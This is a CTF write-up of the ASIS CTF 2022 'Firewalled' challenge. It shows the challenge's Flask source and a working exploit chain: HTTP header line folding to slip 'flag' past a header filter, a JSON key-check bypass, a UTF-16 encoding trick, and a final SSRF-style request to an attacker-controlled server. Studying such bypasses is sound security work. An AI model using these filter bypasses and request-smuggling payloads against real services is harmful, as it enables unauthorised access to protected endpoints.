+++
author = "sh1yo"
title = "[ASIS CTF 2022] Firewalled"
date = "2022-10-16"
description = "\"I made a firewalled curl\". The task was about an old http feature – line folding of headers. In the end, it was solved by 15 teams."
tags = [
    "ctf",
    "python",
    "flask"
]
+++

![img](/images/s2zWMsT7xJMiUbhe0JeCcZQA6M7rw8-N)

Here's my writeup on the Firewalled ctf challenge from ASIS CTF 2022. The task was about an old http feature – line folding of headers. In the end, it was solved by 15 teams.

## Description

We're given a `docker-compose.yml` file with two services: **flag-container** and **firewalled-curl**. The second one is exposed to the internet via the 8000 port. Both of them are flask apps behind apache.

`docker-compose.yml:`
```yml
version: "3.9"

services:
  flag-container:
    build: ./flag-container
    environment:
      - FLAG=ASIS{test-flag}
    restart: always
  firewalled-curl:
    build: ./firewalled-curl
    ports:
      - "8000:80"
    restart: always

```

<details>
<summary> Full code </summary>

`flag-container:`
```py
#!/usr/bin/env python3
from flask import Flask,request
import requests
import json
import os

app = Flask(__name__)
application = app
flag = os.environ.get('FLAG')

@app.route('/flag')
def index():
	args = request.args.get('args')

	try:
		r = requests.post('http://firewalled-curl/req',json=json.loads(args)).json()
		if 'request' in r and 'flag' in r['request'] and 'flag' in request.headers['X-Request']:
			return flag
	except:
		pass
	return 'No flag for you :('

if(__name__ == '__main__'):
	app.run(port=8000)
```

`firewalled-curl:`
```py
#!/usr/bin/env python3
from flask import Flask,Response,request
import time
import socket
import re
import base64
import json

isSafeAscii = lambda s : not re.search(r'[^\x20-\x7F]',s)
isSafeHeader = lambda s : isSafeAscii(s)
isSafePath = lambda s : s[0] == '/' and isSafeAscii(s) and ' ' not in s
badHeaderNames = ['encoding','type','charset']
unsafeKeywords = ["flag"]

app = Flask(__name__)
application = app

def isJson(s):
	try:
	    json.loads(s)
	    return True
	except:
		return False

def checkHostname(name):
	name = str(name)
	port = '80'
	if(':' in name):
		sp = name.split(':')
		name = sp[0]
		port = sp[1]

	if(
		(
		re.search(r'^[a-z0-9][a-z0-9\.-]+$',name) or
		re.search(r'^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$',name)
		) and
		0 < int(port) < 0x10000
	):
		return name,int(port)
	return Exception('unsafe port'),Exception('unsafe hostname')

def recvuntil(sock,u):
	r = b''
	while(r[-len(u):] != u):
		r += sock.recv(1)
	return r

def checkHeaders(headers):
	newHeaders = {}
	if(type(headers) is not dict):
		return Exception('unsafe headers')

	for headerName in headers:
		headerValue = str(headers[headerName])
		if (isSafeHeader(headerName) and ':' not in headerName) and isSafeHeader(headerValue):

			isBad = False
			for badHeaderName in badHeaderNames:
				if(badHeaderName in headerName.lower()):
					isBad = True
					break

			if("flag" in headerValue.lower()):
				isBad = True
				break

			if(isBad):
				return Exception('bad headers')

			newHeaders[headerName] = headerValue

	return newHeaders

def checkMethod(method):
	if(method in ['GET','POST']):
		return method
	return Exception('unsafe method')

def checkPath(path):
	if(isSafePath(path)):
		return path
	return Exception('unsafe path')

def checkJson(j):
	if(type(j) == str):
		for u in unsafeKeywords:
			if(u in j.lower()):
				return False
	elif(type(j) == list):
		for entry in j:
			if(not checkJson(entry)):
				return False
	elif(type(j) == dict):
		for entry in j:
			if(not checkJson(j[entry])):
				return False
	else:
		return True

	return True

@app.route('/req',methods=['POST'])
def req():
	params = request.json

	hostname,port = checkHostname(params['host'])
	headers = checkHeaders(params['headers'])
	method = checkMethod(params['method'])
	path = checkPath(params['path'])
	returnJson = bool(params['returnJson'])
	body = None

	for p in [hostname,headers,body,method,path]:
		if(isinstance(p,Exception)):
			return {'success':False,'error':str(p)}

	if(method == 'POST'):
		body = str(params['body'])


	httpRequest = f'{method} {path} HTTP/1.1\r\n'
	if(port == 80):
		httpRequest+= f'Host: {hostname}\r\n'
	else:
		httpRequest+= f'Host: {hostname}:{port}\r\n'
	httpRequest+= f'Connection: close\r\n'
	if(body):
		httpRequest+= f'Content-Length: {str(len(body))}\r\n'
	for headerName in headers:
		httpRequest+= f'{headerName}: {headers[headerName]}\r\n'
	httpRequest += '\r\n'
	if(body):
		httpRequest += body
	httpRequest = httpRequest.encode()

	with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
		sock.settimeout(1)
		sock.connect((hostname,port))
		sock.sendall(httpRequest)

		statusCode = int(recvuntil(sock,b'\n').split(b' ')[1])
		headers = {}
		line = recvuntil(sock,b'\n').strip()
		while(line):
			headerName = line[:line.index(b':')].strip().decode()
			headerValue = line[line.index(b':')+1:].strip().decode()
			if(isSafeHeader(headerName) and isSafeHeader(headerValue)):
				headers[headerName] = headerValue
			line = recvuntil(sock,b'\n').strip()
		bodyLength = min(int(headers['Content-Length']),0x1000)
		body = b''
		while(len(body) != bodyLength):
			body += sock.recv(1)
		sock.close()

		if(isJson(body.decode())):
			if(not checkJson(json.loads(body.decode()))):
				return {'success':False,'error':'unsafe json'}
			headers['Content-Type'] = 'application/json'
		else:
			headers['Content-Type'] = 'application/octet-stream'

		if(returnJson):
			body = base64.b64encode(body).decode()
			return {'statusCode':statusCode,'headers':headers,'body':body,'req':httpRequest.decode()}

		resp = Response(body)
		resp.status = statusCode

		for headerName in headers:
			for badHeaderName in badHeaderNames:
				if(badHeaderName not in headerName.lower()):
					resp.headers[headerName] = headers[headerName]
		return resp

@app.route('/')
def index():
	resp = Response('hi')
	resp.headers['Content-Type'] = 'text/plain'
	return resp

if(__name__ == '__main__'):
	app.run(port=8000)

```

</details>

The **firewalled-curl** service takes our json input and transforms it into the raw http 1.1 request.
The flag is within the **flag-container** service. We can reach it via **firewalled-curl** because only **firewalled-curl** is exposed to the internet.

The simple request to **flag-container** looks like this:

![img](/images/QYXSLpMSGQG2Nn4ko9A0b0-LZnIH_SLa)

> `Tm8gZmxhZyBmb3IgeW91IDoo` is `No flag for you :(` in base64

Here we're initially requesting **firewalled-curl**. It takes our parameters (host, headers, method, and path) and makes another request to **flag-container**.

`flag-container:`
```python
@app.route('/flag')
def index():
[!]	args = request.args.get('args')

	try:
[!]		r = requests.post('http://firewalled-curl/req',json=json.loads(args)).json()
		if 'request' in r and 'flag' in r['request'] and 'flag' in request.headers['X-Request']:
			return flag
	except:
		pass
	return 'No flag for you :('
```

So to get the flag, we need 2 things:

Firstly -- pass to the route the correct **args** parameter.

The route makes another request via **firewalled-curl** using the **args** parameter (`[!]` lines).

To pass the checks, we need to get the json response that must contain the **request** key with the **flag** value like so `{"request":"flag"}`. We can't do it right away because **firewalled-curl** checks whether the response is json and contains **flag** within it:

`firewalled-curl:`
```python
def isJson(s):
	try:
	    json.loads(s)
	    return True
	except:
		return False

def checkJson(j):
	if(type(j) == str):
        if('flag' in j.lower()):
            return False
	elif(type(j) == list):
		for entry in j:
			if(not checkJson(entry)):
				return False
	elif(type(j) == dict):
		for entry in j:
			if(not checkJson(j[entry])):
				return False
	else:
		return True

	return True

@app.route('/req',methods=['POST'])
def req():
    ..
    <make request>
    <send request>
    <get response>
    ..
    if(isJson(body.decode())):
        if(not checkJson(json.loads(body.decode()))):
            return {'success':False,'error':'unsafe json'}
```

Secondly -- to pass the `'flag' in request.headers['X-Request']` check, we need to send a request that will contain the **X-Request** header with the **flag** value within it. The service also prohibits us from doing this by checking that the **flag** string isn't within any header value.

I decided to start with that second check because it looked way simpler than the first one -- you don't need the second request.

## Request validation

The **/req** endpoint starts with these lines:

`firewalled-curl:`
```python
@app.route('/req',methods=['POST'])
def req():
	params = request.json

	hostname,port = checkHostname(params['host'])
	headers = checkHeaders(params['headers'])
	method = checkMethod(params['method'])
	path = checkPath(params['path'])
	returnJson = bool(params['returnJson'])
	body = None

	for p in [hostname,headers,body,method,path]:
		if(isinstance(p,Exception)):
			return {'success':False,'error':str(p)}

	if(method == 'POST'):
		body = str(params['body'])


	httpRequest = f'{method} {path} HTTP/1.1\r\n'
	if(port == 80):
		httpRequest+= f'Host: {hostname}\r\n'
	else:
		httpRequest+= f'Host: {hostname}:{port}\r\n'
	httpRequest+= f'Connection: close\r\n'
	if(body):
		httpRequest+= f'Content-Length: {str(len(body))}\r\n'
	for headerName in headers:
		httpRequest+= f'{headerName}: {headers[headerName]}\r\n'
	httpRequest += '\r\n'
	if(body):
		httpRequest += body
	httpRequest = httpRequest.encode()
    ..
    <sending request via socker>
    <receiving response>
    ..
```

So we need somehow pass the `X-Request: flag` header. Here's what the `checkHeaders` looks like:

```py
isSafeAscii = lambda s : not re.search(r'[^\x20-\x7F]',s)
isSafeHeader = lambda s : isSafeAscii(s)
badHeaderNames = ['encoding','type','charset']

def checkHeaders(headers):
	newHeaders = {}
	if(type(headers) is not dict):
		return Exception('unsafe headers')

	for headerName in headers:
		headerValue = str(headers[headerName])
		if (isSafeHeader(headerName) and ':' not in headerName) and isSafeHeader(headerValue):

			isBad = False
			for badHeaderName in badHeaderNames:
				if badHeaderName in headerName.lower():
					isBad = True
					break

			if "flag" in headerValue.lower():
				isBad = True
				break

			if isBad:
				return Exception('bad headers')

			newHeaders[headerName] = headerValue

	return newHeaders
```
Looks pretty safe. It iterates over all the headers and ensures that both the header key and value are within the `\x20-\x7F` range. Also, it checks that header keys don't contain `:` and header values don't contain a `flag` substring. So we can't pass a header value with `flag` within it nor inject a new header value.

It's also worth checking other validation functions -- due to the http 1.1 format:

```http
GET / HTTP/1.1
Host: example.com
Key: value

body
```

It's possible to inject new headers if we can pass new lines to the method, path, or host.

```py
def checkHostname(name):
	name = str(name)
	port = '80'
	if(':' in name):
		sp = name.split(':')
		name = sp[0]
		port = sp[1]

	if(
		(
		re.search(r'^[a-z0-9][a-z0-9\.-]+$',name) or
		re.search(r'^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$',name)
		) and
		0 < int(port) < 0x10000
	):
		return name,int(port)
	return Exception('unsafe port'),Exception('unsafe hostname')

def checkMethod(method):
	if(method in ['GET','POST']):
		return method
	return Exception('unsafe method')

isSafePath = lambda s : s[0] == '/' and isSafeAscii(s) and ' ' not in s
def checkPath(path):
	if(isSafePath(path)):
		return path
	return Exception('unsafe path')

```

All the functions look safe without the possibility of injection of new headers.

At this point, we need to figure out how to bypass one of the checks or to cause a parsing difference between these services. I tried a few things, but it seems impossible to do with such a limited charset `\x20-\x7F`.

## Solution to the first problem

I spent a good amount of time trying to bypass the checks, and in the end, it turned out that Flask supports line folding of header fields.

From https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4
>   Historically, HTTP header field values could be extended over multiple lines by preceding each extra line with at least one space or horizontal tab (obs-fold).

It means that if we send

```http
X-Request: something
 flag: x
```

Flask will get only one header -- `("X-Request", "something flag: x")`. And it will bypass **firewalled-curl** protections because the **flag** substring is allowed within the header name, and space `\x20` is within the charset.

We can verify it by changing a bit of the **flag-container** source code:

```py
@app.route('/flag')
def index():

*   if 'X-Request' in request.headers:
*       print(request.headers["X-Request"], 'flag' in request.headers["X-Request"], flush=True)

    args = request.args.get('args')

	try:
		r = requests.post('http://firewalled-curl/req',json=json.loads(args)).json()
		if 'request' in r and 'flag' in r['request'] and 'flag' in request.headers['X-Request']:
			return flag
	except:
		pass
	return 'No flag for you :('
```

Rebuild the container:

```
% docker-compose up --build
```

And now, if we send the following request:

```http
POST /req HTTP/1.1
Host: localhost:8000
Content-Type: application/json
Content-Length: 128

{
    "host":"flag-container",
    "headers":{
        "X-Request":"something",
        " flag": "x"
    },
    "method":"GET",
    "path":"/flag",
    "returnJson":true
}
```

We will see that the **flag** is indeed within the **X-Request** header:

```bash
firewalled-flag-container-1   | [...] something flag: x True
```

## JSON response

So now we need to bypass the second part. We need to get a json response with a **flag** in the **request** element.

```py
@app.route('/flag')
def index():
[!] args = request.args.get('args')

	try:
[!!]	r = requests.post('http://firewalled-curl/req',json=json.loads(args)).json()
		if 'request' in r and 'flag' in r['request'] and 'flag' in request.headers['X-Request']:
			return flag
	except:
		pass
	return 'No flag for you :('
```

The route gets `[!] args` from the request and passes it as a json body to the `[!!] /req` endpoint of **firewalled-curl**.

Let's examine the logic behind the **firewalled-curl** response:

```py
if(isJson(body.decode())): [!!!]
    #something like if 'flag' anywhere in json -- return error
    if(not checkJson(json.loads(body.decode()))):
        return {'success':False,'error':'unsafe json'}
    headers['Content-Type'] = 'application/json'
else:
    headers['Content-Type'] = 'application/octet-stream'


if(returnJson): [!]
    body = base64.b64encode(body).decode()
    return {'statusCode':statusCode,'headers':headers,'body':body,'req':httpRequest.decode()}

resp = Response(body)
resp.status = statusCode

for headerName in headers:
    for badHeaderName in badHeaderNames:
        if(badHeaderName not in headerName.lower()):
            resp.headers[headerName] = headers[headerName]
return resp [!!]
```

First of all, as you may have already noticed, there's a `"returnJson": true` parameter in my requests to `/req`. It tells **firewalled-curl** to wrap the data into the json response instead of just printing the body. `([!] line)`

In case the parameter **returnJson** equals to **false**, **firewalled-curl** just returns the actual response. `([!!] line)`

Because the response with **returnJson** setted to **true** doesn't contain **request** element in its object, we just need to set **returnJson** to **false** and make a request that will return correct json body with **request** element.

But there's a problem. **firewalled-curl** checks whether the body contains a `flag` substring that we need for bypassing the check. `([!!!] line)`

The code for the check looks like this:

```py
def isJson(s):
	try:
	    json.loads(s)
	    return True
	except:
		return False

def checkJson(j):
	if(type(j) == str):
        if('flag' in j.lower()):
            return False
	elif(type(j) == list):
		for entry in j:
			if(not checkJson(entry)):
				return False
	elif(type(j) == dict):
		for entry in j:
			if(not checkJson(j[entry])):
				return False
	else:
		return True

	return True
```

It recursively searches for all the json object elements and returns **False** in case **flag** is within the element with type **str**.

## Solution to the second problem

The bug is quite easy to spot. If **request** is a dict with element like **"flag":"sth"**, only the **"sth"** string will be checked later in recursion.

Also the check from **flag-container** (`'request' in r and 'flag' in r['request']`) will return **True** because **request** element is indeed within the response and has a key **flag** in it.

So to pass both checks, we need to set up a server that will return `{"request":{"flag":"sth"}}`.

### [upd] Intended solution
It turned out that the intended solution was changing the encoding of a json file. The **isJson** function from **firewalled-curl** was failing in the `try {} catch {}` block in case non utf-8 encoding was using.

You can get the utf-16 .json file using the following commands:

```bash
% echo {"request":"flag"} > secret.json
% iconv -f ASCII -t UTF-16 secret.json -o secret_utf16.json
```

After it, you need to remove the first 2 byte-order-mark bytes so that **body.decode()** won’t fail. **Response.json()** from **flag-container** will still correctly guess the encoding (https://github.com/psf/requests/blob/main/requests/utils.py#L950), but **firewalled-curl** will fail to detect the json response.

## Flag

The final request body will look like this:

```json
{
    "host":"flag-container:80",
    "headers":{
        "X-Request":"sth",
        " flag":"sth"
    },
    "method":"GET",
    "path":"/flag?args={\"host\":\"own_server:1000\",\"headers\":{},\"method\":\"GET\",\"path\":\"/secret.json\",\"returnJson\":false}",
    "returnJson":true
}
```

The content of `http://own_server:1000/secret.json` is `{"request":{"flag":"sth"}}`.

![img](/images/RMo6lTcKeTSsel6is9AtxGZB5aCR8r0Q)

And the flag is `ASIS{SEEmS-l1KE-y0u-KN0w-h77p}`